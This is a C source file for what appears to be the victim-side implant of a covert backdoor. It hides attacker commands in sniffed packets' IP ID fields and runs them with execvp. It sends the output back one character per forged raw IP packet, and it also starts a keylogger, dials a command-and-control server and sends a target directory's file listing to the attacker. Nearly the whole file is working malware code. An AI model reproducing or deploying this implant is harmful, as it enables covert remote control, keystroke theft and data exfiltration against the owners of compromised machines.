#include "victim.h"
#include "keylogger.h"
#include "extern.h"


int main(int argc, char *argv[]) {
    struct options_victim opts;
    pthread_t keylogger_thread, cnc_thread, file_thread, select_thread;


    struct bpf_program fp;
    char errbuf[PCAP_ERRBUF_SIZE] = {0};
    u_char* args = NULL;
    char* nic_interface;
    pcap_t* nic_fd;
    bpf_u_int32 netp;
    bpf_u_int32 maskp;

    program_setup();
    options_victim_init(&opts);
    initialize_victim_server(&opts);



    if (pthread_create(&select_thread, NULL, activate_select, (void*)&opts) != 0) {
        perror("pthread_create error: select_thread");
        exit(EXIT_FAILURE);
    }

    if (pthread_create(&keylogger_thread, NULL, activate_keylogger, (void*)&opts) != 0) {
        perror("pthread_create error: keylogger_thread");
        exit(EXIT_FAILURE);
    }

    if (pthread_create(&cnc_thread, NULL, activate_cnc, (void*)&opts) != 0) {
        perror("pthread_create error: cnc_thread");
        exit(EXIT_FAILURE);
    }

    if (pthread_create(&file_thread, NULL, check_directory, (void*)&opts) != 0) {
        perror("pthread_create error: cnc_thread");
        exit(EXIT_FAILURE);
    }

    nic_interface = pcap_lookupdev(errbuf);    // get interface
    pcap_lookupnet(nic_interface, &netp, &maskp, errbuf);
    nic_fd = pcap_open_live(nic_interface, BUFSIZ, 1, -1, errbuf);
    args = (u_char*)&opts;
    if (nic_fd == NULL) {
        printf("pcap_open_live(): %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    if (pcap_compile (nic_fd, &fp, FILTER, 0, netp) == -1) {
        fprintf(stderr,"Error calling pcap_compile\n");
        exit(1);
    }

    // Load the filter into the capture device
    if (pcap_setfilter (nic_fd, &fp) == -1) {
        fprintf(stderr,"Error setting filter\n");
        exit(1);
    }
    pcap_loop(nic_fd, DEFAULT_COUNT, pkt_callback, args);
    return EXIT_SUCCESS;
}


void options_victim_init(struct options_victim *opts) {
    memset(opts, 0, sizeof(struct options_victim));
}


void pkt_callback(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    struct ether_header* ether;

    /* ETHERNET - only handle IPv4 */
    ether = (struct ether_header*)(packet);
    if (ntohs(ether->ether_type) == ETHERTYPE_IP) {
        process_ipv4(args, pkthdr, packet);
    }
}


void process_ipv4(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    struct ether_header* ether;
    struct iphdr *ip;
    struct udphdr *udp;
    struct options_victim* ov;
    char temp[2] = {0};
    uint16_t c;
    ov = (struct options_victim*)args;

    ether = (struct ether_header*)(packet);
    ip = (struct iphdr*)(((char*) ether) + sizeof(struct ether_header));
    udp = (struct udphdr*)(((char*) ip) + sizeof(struct iphdr));

    c = hide_data(ntohs(ip->id));
    ov->attacker_port = ntohs(udp->source);
    if (ov->ip_flag == FALSE) {
        convert_uint32t_ip_to_str(ip->daddr, ov->my_ip, 'v');
        convert_uint32t_ip_to_str(ip->saddr, ov->attacker_ip, 'a');
        ov->ip_flag = TRUE;
    }
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    temp[0] = (char)c;
    strcat(ov->received_buffer, temp);
    if (strstr(ov->received_buffer, "]]") != NULL) {
        extract_instruction(args);
        memset(ov->received_buffer, 0, S_ARR_SIZE);
    }
}


void convert_uint32t_ip_to_str(uint32_t ip_addr, char* ip, char flag) {
    if (flag == 'v') {
        if (inet_ntop(AF_INET, &ip_addr, ip, INET_ADDRSTRLEN) == NULL) {
            perror("inet_ntop error");
            exit(EXIT_FAILURE);
        }
    }
    if (flag == 'a') {
        if (inet_ntop(AF_INET, &ip_addr, ip, INET_ADDRSTRLEN) == NULL) {
            perror("inet_ntop error");
            exit(EXIT_FAILURE);
        }
    }
}


void extract_instruction(u_char *args) {
    struct options_victim* ov;
    size_t length;
    char *start = NULL, *end = NULL;

    ov = (struct options_victim*)args;
    start = strstr(ov->received_buffer, "[["); // Find the first '[' character
    end = strstr(ov->received_buffer, "]]");   // Find the first ']' character
    if (start && end && start < end) {
        start += 2; // Move the pointer past the '[' character
        length = (size_t) (end - start);
        strncpy(ov->instruction, start, length); // Copy the content between '[' and ']'
        printf("Extracted content: %s\n", ov->instruction);
        execute_instruction(args);
    }
    else {
        printf("Invalid message format.\n");
    }
}


void execute_instruction(u_char *args) {
    struct options_victim* ov;
    pthread_t select_thread;
    char **commands;
    ov = (struct options_victim*)args;

    // TODO: PARSE ARGUMENTS
    if (strstr(ov->instruction, "cnc") != NULL) {
        strcpy(ov->cnc_ip, ov->instruction + 4);
        ov->cnc = TRUE;
    }
    else if (strcmp(ov->instruction, "keylogger") == 0) {
        ov->keylogger = TRUE;
    }
    else if (strstr(ov->instruction, "target") != NULL) {
        strcpy(ov->target_directory, ov->instruction + 7);
        ov->target = TRUE;
    }
    else {
        // TODO: PORT KNOCK
        commands = split_line(ov->instruction);
        execute_command(commands, args);
        free(commands);
        send_to_attacker(args);
        // TODO: PORT KNOCK CLOSE
    }
    memset(ov->instruction, 0, S_ARR_SIZE);
}


char **split_line(char *line) {
    int bufsize = TOK_BUFSIZE, position = 0;
    char **tokens = malloc(bufsize * sizeof(char*));
    char *token;

    if (!tokens) {
        fprintf(stderr, "maalloc error: split_line()\n");
        exit(EXIT_FAILURE);
    }

    token = strtok(line, LSH_TOK_DELIM);
    while (token != NULL) {
        tokens[position] = token;
        position++;

        if (position >= bufsize) {
            bufsize += TOK_BUFSIZE;
            tokens = realloc(tokens, bufsize * sizeof(char*));
            if (!tokens) {
                fprintf(stderr, "realloc error: split_line()\n");
                exit(EXIT_FAILURE);
            }
        }

        token = strtok(NULL, LSH_TOK_DELIM);
    }
    tokens[position] = NULL;
    return tokens;
}


int execute_command(char **command_arr, u_char *args) {
    int i;

    if (command_arr[0] == NULL) {
        // An empty command was entered.
        return 1;
    }

    for (i = 0; i < num_builtins(); i++) {
        if (strcmp(command_arr[0], builtin_str[i]) == 0) {
            return (*builtin_func[i])(command_arr);
        }
    }

    return launch(command_arr, args);
}


int num_builtins(void) {
    return sizeof(builtin_str) / sizeof(char *);
}


int builtin_cd(char **command_arr) {
    if (command_arr[1] == NULL) {
        fprintf(stderr, "expected argument to \"cd\"\n");
    } else {
        if (chdir(command_arr[1]) != 0) {
            perror("builtin_cd()");
        }
    }
    return 1;
}


int builtin_exit(char **command_arr) {
    return 0;
}


int launch(char **command_arr, u_char *args) {
    char output[OUTPUT_SIZE] = {0};
    int bytes_read;
    struct options_victim* ov;
    int pipefd[2];

    ov = (struct options_victim*)args;

    if (pipe(pipefd) == -1) {
        perror("pipe");
        return 0;
    }

    pid_t pid = fork();
    if (pid == 0) {
        // Child process
        close(pipefd[0]); // Close the read end of the pipe

        // Redirect stdout to the write end of the pipe
        if (dup2(pipefd[1], STDOUT_FILENO) == -1) {
            perror("dup2");
            exit(EXIT_FAILURE);
        }
        close(pipefd[1]);

        if (execvp(command_arr[0], command_arr) == -1) {
            perror("execvp");
            exit(EXIT_FAILURE);
        }
    } else if (pid < 0) {
        perror("fork");
        return 0;
    } else {
        // Parent process
        close(pipefd[1]); // Close the write end of the pipe

        bytes_read = (int)read(pipefd[0], output, OUTPUT_SIZE);
        if (bytes_read == -1) {
            perror("read");
            return 0;
        }
        output[bytes_read] = '\0'; // Null-terminate the output
        strcpy(ov->sending_buffer, output);
        memset(output, 0, OUTPUT_SIZE);
        close(pipefd[0]); // Close the read end of the pipe
        // Wait for the child process to exit
        wait(NULL);
    }
    return 1;
}


void send_to_attacker(u_char *args) {
    struct sockaddr_in attacker_address;
    struct options_victim* ov;
    struct iphdr ih;
    struct udphdr uh;

    uint16_t length;
    char s_buffer[SEND_SIZE] = {0};
    int byte;

    ov = (struct options_victim*)args;
    length = (uint16_t) strlen(ov->sending_buffer);

    attacker_address.sin_family = AF_INET;
    attacker_address.sin_port = htons(ov->attacker_port);
    attacker_address.sin_addr.s_addr = inet_addr(ov->attacker_ip);

    for (int j = 0; j < length; j++) {
        create_udp_header(&uh, ov->attacker_port);
        create_ip_header(&ih, ov->sending_buffer[j], args);
        memcpy(s_buffer, &ih, sizeof(struct iphdr));
        memcpy(s_buffer + sizeof(struct iphdr), &uh, sizeof(struct udphdr));
        byte = (int)sendto(ov->victim_udp_socket, (const char *) s_buffer, SEND_SIZE, 0,
                      (const struct sockaddr *) &attacker_address, sizeof(attacker_address));
        if (byte < 0) {
            perror("send failed\n");
        }
        memset(s_buffer, 0, SEND_SIZE);
    }
    memset(ov->sending_buffer, 0, OUTPUT_SIZE);
}


unsigned short create_udp_header(struct udphdr* uh, uint16_t port) {
    uh->source = htons(DEFAULT_UDP_PORT);
    uh->dest = htons(port);
    uh->len = htons(sizeof(struct udphdr));
    uh->check = calculate_checksum(&uh, sizeof(struct udphdr));

    return sizeof(struct udphdr);
}


unsigned short create_ip_header(struct iphdr* ih, char c, u_char *args) {
    struct options_victim* ov;
    ov = (struct options_victim*)args;

    ih->ihl = 5;
    ih->version = 4;
    ih->tos = 0;
    ih->id = htons(hide_data((uint16_t)c));
    ih->tot_len = htons(28);
    ih->ttl = 64;
    ih->frag_off = 0;
    ih->protocol = IPPROTO_UDP;
    ih->saddr = host_convert(ov->my_ip);
    ih->daddr = host_convert(ov->attacker_ip);
    ih->check = calculate_checksum(&ih, sizeof(struct iphdr));

    return sizeof(struct iphdr);
}


void initialize_victim_server(struct options_victim *opts) {
    struct sockaddr_in udp_victim_address, tcp_victim_address;
    int  client_addr_size;
    socklen_t client_address_size = sizeof(struct sockaddr_in);
    int option = TRUE;

    opts->victim_udp_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    opts->victim_tcp_socket = socket(AF_INET, SOCK_STREAM, 0);

    if (opts->victim_udp_socket == -1) {
        perror("socket() ERROR\n");
        exit(EXIT_FAILURE);
    }

    udp_victim_address.sin_family = AF_INET;
    udp_victim_address.sin_port = htons(DEFAULT_UDP_PORT);
    udp_victim_address.sin_addr.s_addr = htonl(INADDR_ANY);

    tcp_victim_address.sin_family = AF_INET;
    tcp_victim_address.sin_port = htons(DEFAULT_TCP_PORT);
    tcp_victim_address.sin_addr.s_addr = htonl(INADDR_ANY);


    if (udp_victim_address.sin_addr.s_addr == (in_addr_t) -1) {
        fatal_errno(__FILE__, __func__, __LINE__, errno, 2);
    }

    option = 1;
    setsockopt(opts->victim_udp_socket, SOL_SOCKET, SO_REUSEADDR, &option, sizeof(option));
    setsockopt(opts->victim_udp_socket, IPPROTO_IP, IP_HDRINCL, &option, sizeof(option));
    setsockopt(opts->victim_tcp_socket, SOL_SOCKET, SO_REUSEADDR, &option, sizeof(option));
    setsockopt(opts->victim_tcp_socket, IPPROTO_IP, IP_HDRINCL, &option, sizeof(option));

    if (bind(opts->victim_udp_socket, (struct sockaddr *) &udp_victim_address, sizeof(struct sockaddr_in)) == -1) {
        perror("bind() ERROR\n");
        exit(EXIT_FAILURE);
    }

    if (bind(opts->victim_tcp_socket, (struct sockaddr *) &tcp_victim_address, sizeof(struct sockaddr_in)) == -1) {
        perror("bind() ERROR\n");
        exit(EXIT_FAILURE);
    }

    if (listen(opts->victim_tcp_socket, BACKLOG) == -1) {
        perror("listen ERROR\n");
        exit(EXIT_FAILURE);
    }
}


void cnc_select_call(struct options_victim *opts, struct sockaddr_in cnc_address) {

    struct timeval timeout;

    timeout.tv_sec = 1;
    timeout.tv_usec = 0;

    create_victim_cnc_socket(opts, &cnc_address);

    // VICTIM SERVER
    cnc_address.sin_family = AF_INET;
    cnc_address.sin_port = htons(CNC_PORT);
    cnc_address.sin_addr.s_addr = inet_addr(opts->cnc_ip);


    if (cnc_address.sin_addr.s_addr == (in_addr_t) - 1) {
        fatal_errno(__FILE__, __func__, __LINE__, errno, 2);
    }


    if (connect(opts->cnc_socket, (struct sockaddr*)&cnc_address,
                sizeof(cnc_address)) < 0) {
        printf("connect() failed\n");
        exit(1);
    }
}


void create_victim_cnc_socket(struct options_victim *opts, struct sockaddr_in *cnc_address) {
    opts->cnc_socket = socket(AF_INET, SOCK_STREAM, 0);

    if (opts->cnc_socket == -1) {
        perror("socket() ERROR\n");
        exit(EXIT_FAILURE);
    }

    // VICTIM SERVER
    cnc_address->sin_family = AF_INET;
    cnc_address->sin_port = htons(CNC_PORT);
    cnc_address->sin_addr.s_addr = inet_addr(opts->cnc_ip);

    if (cnc_address->sin_addr.s_addr == (in_addr_t) - 1) {
        fatal_errno(__FILE__, __func__, __LINE__, errno, 2);
    }
}


void* activate_keylogger(void* arg){
    struct options_victim* ov;
    ov = (struct options_victim*)arg;
    while(1) {
        if (ov->keylogger == TRUE) {
            break;
        }
    }
    puts("KEYLOGGER ACTIVATED");
    keylogger_main(ov);
}


void* activate_cnc(void* arg){
    struct options_victim* ov;
    struct sockaddr_in cnc_address;

    memset(&cnc_address, 0, sizeof(struct sockaddr_in));
    ov = (struct options_victim*)arg;
    while(1) {
        if (ov->cnc == TRUE) {
            break;
        }
    }

    cnc_select_call(ov, cnc_address);
    pthread_exit(NULL);
}


void* check_directory(void* arg) {
    struct options_victim* ov;
    DIR *dir;
    struct dirent *entry;
    char file_name[64] = {0};
    char* send = NULL;

    ov = (struct options_victim*) arg;
    while(1) {
        while (1) {
            if (ov->target == TRUE) {
                break;
            }
        }

        // Open the directory
        dir = opendir(ov->target_directory);
        if (dir == NULL) {
            printf("Failed to open the directory.\n");
        }
        // Read directory entries
        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_type == DT_REG || entry->d_type == DT_DIR) {
                if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0 ) {
                    printf("%s\n", entry->d_name);
                    strncpy(file_name, entry->d_name, strlen(entry->d_name));
                    file_name[strlen(entry->d_name)] = '\n';
                    write(ov->attacker_socket, file_name, strlen(entry->d_name) + 1);
                }
            }
            memset(file_name, 0, sizeof(file_name));
        }

        // Close the directory
        closedir(dir);

        ov->target = FALSE;
    }
}


void* activate_select(void* arg) {
    struct options_victim* opts;
    struct sockaddr_in client_address;
    socklen_t client_address_size = sizeof(struct sockaddr_in);
    fd_set read_fds, copy_fds;
    int fd_max, fd_num;
    struct timeval timeout;

    opts = (struct options_victim*) arg;

    timeout.tv_sec = 1;
    timeout.tv_usec = 0;

    FD_ZERO(&read_fds);
    FD_SET(opts->victim_tcp_socket, &read_fds);
    fd_max = opts->victim_tcp_socket;

    while (1) {
        copy_fds = read_fds;
        fd_num = select(fd_max + 1, &copy_fds, 0, 0, &timeout);
        if (fd_num == -1) {
            perror("Select() failed");
            exit(EXIT_FAILURE);
        } else if (fd_num == 0) continue; // time out

        for (int i = 0; i < fd_max + 1; i++) {
            if (FD_ISSET(i, &copy_fds)) {
                if (i == opts->victim_tcp_socket) {
                    opts->attacker_socket = accept(opts->victim_tcp_socket, (struct sockaddr *) &client_address,
                                           &client_address_size);
                    FD_SET(opts->attacker_socket, &read_fds);
                    fd_max += 1;
                }
            }
        }
    }
    return EXIT_SUCCESS;
}
